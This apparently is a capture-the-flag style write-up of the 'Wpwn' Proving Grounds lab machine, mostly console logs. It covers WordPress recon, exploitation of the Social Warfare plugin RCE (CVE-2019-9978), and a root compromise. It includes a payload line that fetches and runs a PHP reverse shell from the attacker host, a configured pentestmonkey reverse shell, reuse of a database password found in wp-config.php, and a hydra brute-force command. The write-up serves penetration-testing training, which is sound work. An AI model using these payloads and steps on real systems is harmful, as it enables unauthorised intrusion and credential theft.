# Recon

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# nmap -Pn -sT -sV -n 192.168.84.123 -p- --min-rate 1000 --max-retries 2 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-03 23:28 CST
Warning: 192.168.84.123 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.84.123
Host is up (0.10s latency).
Not shown: 61923 closed ports, 3610 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.35 seconds
``` 

## HTTP TCP/80

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Wpwn/img/1.png)


```console
root@kali:/OSCPv3/offsec_pg/Wpwn# nmap -Pn -sT -sV --script http-enum -n 192.168.84.123 -p 80
Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-03 23:34 CST
Nmap scan report for 192.168.84.123
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-enum: 
|   /wordpress/: Blog
|   /robots.txt: Robots file
|_  /wordpress/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.13 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# python3 /opt/dirsearch/dirsearch.py -u http://192.168.84.123/wordpress -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 220521

Error Log: /opt/dirsearch/logs/errors-21-12-03_23-45-22.log

Target: http://192.168.84.123/wordpress

[23:45:23] Starting: 
[23:45:24] 200 -   27KB - /wordpress/
[23:45:26] 301 -  331B  - /wordpress/wp-content  ->  http://192.168.84.123/wordpress/wp-content/
[23:45:32] 301 -  332B  - /wordpress/wp-includes  ->  http://192.168.84.123/wordpress/wp-includes/
[23:46:44] 301 -  329B  - /wordpress/wp-admin  ->  http://192.168.84.123/wordpress/wp-admin/

Task Completed
``` 


![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Wpwn/img/2.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Wpwn/img/3.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Wpwn/img/4.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Wpwn/img/5.png)


```console
root@kali:/OSCPv3/offsec_pg/Wpwn# python3 /opt/dirsearch/dirsearch.py -u http://192.168.84.123/wordpress  -e php,txt -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: get | Threads: 10 | Wordlist size: 6432

Error Log: /opt/dirsearch/logs/errors-21-12-04_00-36-41.log

Target: http://192.168.84.123/wordpress

[00:36:42] Starting: 
[00:37:26] 301 -    0B  - /wordpress/index.php  ->  http://192.168.84.123/wordpress/
[00:37:29] 200 -   19KB - /wordpress/license.txt
[00:37:43] 200 -    7KB - /wordpress/readme.html
[00:37:56] 301 -  329B  - /wordpress/wp-admin  ->  http://192.168.84.123/wordpress/wp-admin/
[00:37:56] 302 -    0B  - /wordpress/wp-admin/  ->  http://192.168.84.123/wordpress/wp-login.php?redirect_to=http%3A%2F%2F192.168.84.123%2Fwordpress%2Fwp-admin%2F&reauth=1
[00:37:56] 200 -    0B  - /wordpress/wp-config.php
[00:37:56] 409 -    3KB - /wordpress/wp-admin/setup-config.php
[00:37:56] 200 -    1KB - /wordpress/wp-admin/install.php
[00:37:56] 301 -  331B  - /wordpress/wp-content  ->  http://192.168.84.123/wordpress/wp-content/
[00:37:56] 200 -    0B  - /wordpress/wp-content/
[00:37:56] 200 -   69B  - /wordpress/wp-content/plugins/akismet/akismet.php
[00:37:56] 200 -    1KB - /wordpress/wp-content/uploads/
[00:37:56] 301 -  332B  - /wordpress/wp-includes  ->  http://192.168.84.123/wordpress/wp-includes/
[00:37:56] 500 -    0B  - /wordpress/wp-includes/rss-functions.php
[00:37:56] 200 -    7KB - /wordpress/wp-login.php
[00:37:57] 200 -   47KB - /wordpress/wp-includes/
[00:37:57] 405 -   42B  - /wordpress/xmlrpc.php
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Wpwn/img/6.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Wpwn/img/7.png)

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# wfuzz -c -t 500 --hc=404 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt  http://192.168.84.123/wordpress/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.84.123/wordpress/FUZZ
Total requests: 13366

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000002:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/%d0%af%d0%bd%d0%b4%d0%b5%d0%ba%d1%81%d0%a4%d0%be%d1%82%d0%ba%d0%b8000003:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/%d0%b1%d1%83%d1%82%d0%be%d0%bd-%d0%b7%d0%b0-%d1%81%d0%bf%d0%be%d0%000004:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/%d0%bf%d1%80%d0%b0%d0%b2%d0%be%d1%81%d0%bb%d0%b0%d0%b2%d0%bd%d1%8b001842:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/chinese-word-count%e4%b8%ad%e6%96%87%e5%ad%97%e6%95%b0%e7%bb%9f%e8004592:  C=500      0 L	       0 W	      0 Ch	  "wp-content/plugins/hello.php/"
003102:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/editorbg-%d0%b7%d0%b0-%d1%87%d0%b8%d1%81%d1%82-%d0%b1%d1%8a%d0%bb%005994:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/make-me-social-automatically-submit-posts-to-delicious-twitter-tum002742:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/digital-scientists%e2%80%99-image-commenting-plugin-for-wordpress/008317:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/remove-category-permalinks-from-url-without-htaccess-and-301-redir009740:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/subscription-dna-subscription-billing-and-membership-management-pl010332:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/tradueix2en-traductor-catala-angles-catalan-to-english-translator/010531:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/twitter-brand-sponsors-sidebar-widget-by-mashable-and-danzarrella/011222:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/will-the-admins-please-remove-the-wp-traffic-plugin-it-is-not-a-pl011292:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/wordpress-23-compatible-wordpress-delicious-daily-synchronization-011589:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/wp-%eb%8b%a4%ec%9d%8c-%eb%b8%94%eb%a1%9c%ea%b1%b0-%eb%89%b4%ec%8a%012991:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/wpmu-fast-verification-for-google-webmaster-tools-and-yahoo-site-e001779:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/ceske-a-slovenske-linkovaci-sluzby-directory-for-svn-cz-sk-sociabl007923:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/put-the-category-selector-back-to-the-sidebar-of-the-post-page-bef004591:  C=500      0 L	       0 W	      0 Ch	  "wp-content/plugins/hello.php"
000469:  C=200      0 L	       0 W	      0 Ch	  "wp-content/plugins/akismet/"
000283:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/admins-please-remove-the-wp-traffic-plugin-it-is-not-a-plugin-to-i000217:  C=404      9 L	      31 W	    276 Ch	  "wp-content/plugins/addthischina-%e6%94%b6%e8%97%8f%e5%88%86%e4%ba%ab%e6%8c%89%e9%92%a
Total time: 66.44904
Processed Requests: 13366
Filtered Requests: 13363
Requests/sec.: 201.1466
```

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# searchsploit akismet
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Akismet - Multiple Cross-Site Scripting Vulnerabilities                                      | php/webapps/37902.php
WordPress Plugin Akismet 2.1.3 - Cross-Site Scripting                                                         | php/webapps/30036.html
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
``` 


```console
root@kali:/OSCPv3/offsec_pg/Wpwn# wpscan --url  http://192.168.84.123/wordpress/wp-login.php --detection-mode aggressive --rua --wp-content-dir "wordpress/wp-content" --wp-plugins-dir "wordpress/wp-content/plugins" -e ap,dbe,u,at --plugins-detection aggressive --plugins-version-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.84.123/wordpress/wp-login.php/ [192.168.84.123]
[+] Started: Sat Dec  4 00:26:34 2021

Interesting Finding(s):

[+] http://192.168.84.123/wordpress/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://192.168.84.123/wordpress/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).
 | Found By: Query Parameter In Install Page (Aggressive Detection)
 |  - http://192.168.84.123/wordpress/wp-includes/css/dashicons.min.css?ver=5.5
 |  - http://192.168.84.123/wordpress/wp-includes/css/buttons.min.css?ver=5.5
 |  - http://192.168.84.123/wordpress/wp-admin/css/forms.min.css?ver=5.5
 |  - http://192.168.84.123/wordpress/wp-admin/css/l10n.min.css?ver=5.5

[i] The main theme could not be detected.

.....
.....
.....
```

```shell
wpscan --url  http://192.168.84.123/wordpress/ --rua -e ap,u
```

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# wpscan --url  http://192.168.84.123/wordpress/ --rua -e ap,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.84.123/wordpress/ [192.168.84.123]
[+] Started: Sat Dec  4 00:41:13 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.84.123/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.84.123/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.84.123/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.84.123/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.84.123/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5</generator>
 |  - http://192.168.84.123/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://192.168.84.123/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://192.168.84.123/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://192.168.84.123/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.84.123/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] social-warfare
 | Location: http://192.168.84.123/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2021-07-20T16:09:00.000Z
 | [!] The version is out of date, the latest version is 4.3.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | Version: 3.5.2 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.84.123/wordpress/, Match: 'Social Warfare v3.5.2'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.84.123/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.2
 |   - http://192.168.84.123/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.2
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.84.123/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.84.123/wordpress/wp-content/plugins/social-warfare/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.84.123/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Dec  4 00:41:27 2021
[+] Requests Done: 52
[+] Cached Requests: 6
[+] Data Sent: 16.327 KB
[+] Data Received: 433.717 KB
[+] Memory used: 162.422 MB
[+] Elapsed time: 00:00:13
```

# Explotation

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# searchsploit social warfare
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                                               | php/webapps/46794.py
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
``` 

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# searchsploit -m 46794
  Exploit: WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46794
     Path: /usr/share/exploitdb/exploits/php/webapps/46794.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /OSCPv3/offsec_pg/Wpwn/46794.py
```

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# searchsploit -x 46794
....


# Title: RCE in Social Warfare Plugin Wordpress ( <=3D3.5.2 )
# Date: March, 2019
# Researcher: Luka Sikic
# Exploit Author: hash3liZer
# Download Link: https://wordpress.org/plugins/social-warfare/
# Reference: https://wpvulndb.com/vulnerabilities/9259?fbclid=3DIwAR2xLSnan=ccqwZNqc2c7cIv447Lt80mHivtyNV5ZXGS0ZaScxIYcm1XxWXM
# Github: https://github.com/hash3liZer/CVE-2019-9978
# Version: <=3D 3.5.2
# CVE: CVE-2019-9978

# Title: RCE in Social Warfare Plugin Wordpress ( <=3.5.2 )
# Date: March, 2019
# Researcher: Luka Sikic
# Exploit Author: hash3liZer
# Download Link: https://wordpress.org/plugins/social-warfare/
# Reference: https://wpvulndb.com/vulnerabilities/9259?fbclid=IwAR2xLSnanccqwZNqc2c7cIv447Lt80mHivtyNV5ZXGS0ZaScxIYcm1XxWXM
# Github: https://github.com/hash3liZer/CVE-2019-9978
# Version: <= 3.5.2
# CVE: CVE-2019-9978

import sys
import requests
import re
import urlparse
import optparse

class EXPLOIT:

        VULNPATH = "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s"

        def __init__(self, _t, _p):
                self.target  = _t
                self.payload = _p
......
......
......
```


```console
root@kali:/OSCPv3/offsec_pg/Wpwn# curl "http://192.168.149.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.149"
....
....
```

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.149] from (UNKNOWN) [192.168.149.123] 57220
GET /?swp_debug=get_user_options HTTP/1.0
Host: 192.168.49.149
Connection: close
```


```console
root@kali:/OSCPv3/offsec_pg/Wpwn# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
--2021-12-05 12:02:00--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 5491 (5,4K) [text/plain]
Grabando a: “php-reverse-shell.php”

php-reverse-shell.php               100%[===================================================================>]   5,36K  --.-KB/s    en 0,001s  

2021-12-05 12:02:01 (6,01 MB/s) - “php-reverse-shell.php” guardado [5491/5491]
```

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# nano php-reverse-shell.php 
....
....

//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.49.149';  // CHANGE THIS
$port = 80;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
....
....
```


```console
root@kali:/OSCPv3/offsec_pg/Wpwn# nano payload.txt
<pre>system('wget http://192.168.49.149:8000/php-reverse-shell.txt && php php-reverse-shell.txt')</pre>
```

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# python 46794.py --target http://192.168.149.123/ --payload-uri http://192.168.49.149:8000/payload.txt
[>] Sending Payload to System!
```

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.149.123 - - [05/Dec/2021 12:15:36] "GET /php-reverse-shell.txt HTTP/1.1" 200 -
```

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.149] from (UNKNOWN) [192.168.149.123] 57244
Linux wpwn 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
 13:15:37 up 31 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@wpwn:/$ ^Z
[1]+  Detenido                nc -lvnp 80
root@kali:/OSCPv3/offsec_pg/Wpwn# stty raw -echo
root@kali:/OSCPv3/offsec_pg/Wpwn# nc -lvnp 80
                                             reset
reset: unknown terminal type unknown
Terminal type? xterm
www-data@wpwn:/$ export TERM=xterm-256color
www-data@wpwn:/$ export SHELL=bash
www-data@wpwn:/$
```

```console
www-data@wpwn:/var/www$ ls -la
total 16
drwxr-xr-x  3 root     root     4096 Dec 14  2020 .
drwxr-xr-x 12 root     root     4096 Aug 17  2020 ..
drwxr-xr-x  3 root     root     4096 Dec 14  2020 html
-rw-r--r--  1 www-data www-data   33 Dec  5 12:44 local.txt
www-data@wpwn:/var/www$ cat local.txt 
ddbfcfe429008c6bd9eb6e7f681e627c
www-data@wpwn:/var/www$ 
```

# Privilege escalation

```console
www-data@wpwn:/var/www/html$ ls 
index.html  robots.txt	wordpress
www-data@wpwn:/var/www/html$ ls wordpress/
index.php	 wp-blog-header.php    wp-cron.php	  wp-mail.php
license.txt	 wp-comments-post.php  wp-includes	  wp-settings.php
readme.html	 wp-config-sample.php  wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config.php	       wp-load.php	  wp-trackback.php
wp-admin	 wp-content	       wp-login.php	  xmlrpc.php
``` 

```console
www-data@wpwn:/home/takis$ ls 
user.txt
```

```console
www-data@wpwn:/home/takis$ cat /etc/passwd |grep bash
root:x:0:0:root:/root:/bin/bash
takis:x:1000:1000:takis,,,:/home/takis:/bin/bash
www-data@wpwn:/home/takis$ 
```

```console
www-data@wpwn:/home/takis$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
sudo: 3 incorrect password attempts
```


```console
www-data@wpwn:/home/takis$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/umount
```

```console
www-data@wpwn:/home/takis$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
/proc
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.access
/sys/fs/cgroup/memory/user.slice/cgroup.event_control
/sys/fs/cgroup/memory/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/mariadb.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/vgauth.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dev-disk-by\x2duuid-2e6f99e0\x2d8bcd\x2d48e6\x2dab48\x2db776338d17e8.swap/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-getty.slice/getty@tty1.service/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/sys/fs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/tmp/test
/var/www/html/wordpress/wp-config.php
```

```console
www-data@wpwn:/tmp$ wget http://192.168.49.149:8000/linpeas.sh
--2021-12-05 13:41:01--  http://192.168.49.149:8000/linpeas.sh
Connecting to 192.168.49.149:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 634071 (619K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                          100%[===================================================================>] 619.21K  1.05MB/s    in 0.6s    

2021-12-05 13:41:02 (1.05 MB/s) - 'linpeas.sh' saved [634071/634071]

www-data@wpwn:/tmp$ chmod +x linpeas.sh 
www-data@wpwn:/tmp$ ./linpeas.sh 
www-data@wpwn:/tmp$ ./linpeas.sh > linpeas.txt
```

```console
www-data@wpwn:/tmp$ more linpeas.txt
....
....
════════════════════════════════════╣ Basic information ╠════════════════════════════════════
OS: Linux version 4.19.0-10-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (20
20-07-24)
....
....
════════════════════════════════════╣ System Information ╠════════════════════════════════════
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.19.0-10-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)
Distributor ID:	Debian
Description:	Debian GNU/Linux 10 (buster)
Release:	10
Codename:	buster
....
....
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

Available information:

Kernel version: 4.19.0
Architecture: x86_64
Distribution: debian
Distribution version: 10
....
....
Possible Exploits:

[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{
kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.
....
....

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3203 Aug 17  2020 /var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress_db' );
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );
define( 'DB_HOST', 'localhost' );


╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

password="anon@ftp.com";
```

```console
www-data@wpwn:/tmp$ su takis
Password: R3&]vzhHmMn9,:-5
takis@wpwn:/tmp$ 
```

```console
takis@wpwn:/tmp$ sudo -l
Matching Defaults entries for takis on wpwn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User takis may run the following commands on wpwn:
    (ALL) NOPASSWD: ALL
takis@wpwn:/tmp$ sudo su
root@wpwn:/tmp# whoami
root
root@wpwn:/tmp# cd /root
root@wpwn:~# ls -la
total 28
drwx------  3 root root 4096 Dec  5 12:43 .
drwxr-xr-x 18 root root 4096 Dec 14  2020 ..
-rw-------  1 root root    0 Dec 14  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Dec 14  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Dec  5 12:44 proof.txt
-rw-r--r--  1 root root   32 Dec 14  2020 root.txt
root@wpwn:~# cat proof.txt 
e2a3e554cc6e4cdc29a85700456a07b4
```

### Notes

```console
root@kali:/OSCPv3/offsec_pg/Wpwn# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.84.123 http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.84.123%2Fwordpress%2Fwp-admin%2F&testcookie=1:Lost your password"
